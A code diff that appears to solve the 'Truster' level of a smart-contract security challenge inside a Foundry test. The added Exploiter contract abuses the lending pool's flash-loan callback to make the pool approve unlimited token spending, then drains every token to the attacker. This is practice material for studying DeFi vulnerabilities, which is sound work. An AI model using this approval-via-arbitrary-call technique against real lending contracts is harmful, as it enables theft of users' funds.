@@ -37,6 +37,8 @@ contract Truster is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.prank(attacker);
+        Exploiter exploiter = new Exploiter(trusterLenderPool, dvt, attacker);
 
         /** EXPLOIT END **/
         validation();
@@ -46,5 +48,26 @@ contract Truster is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
+    }
+}
+
+contract Exploiter {
+    constructor(
+        TrusterLenderPool pool,
+        DamnValuableToken dvt,
+        address attacker
+    ) {
+        pool.flashLoan(
+            0,
+            address(69),
+            address(dvt),
+            abi.encodeWithSignature(
+                "approve(address,uint256)",
+                address(this),
+                type(uint256).max
+            )
+        );
+        uint256 extractableBalance = dvt.balanceOf(address(pool));
+        dvt.transferFrom(address(pool), attacker, extractableBalance);
     }
 }
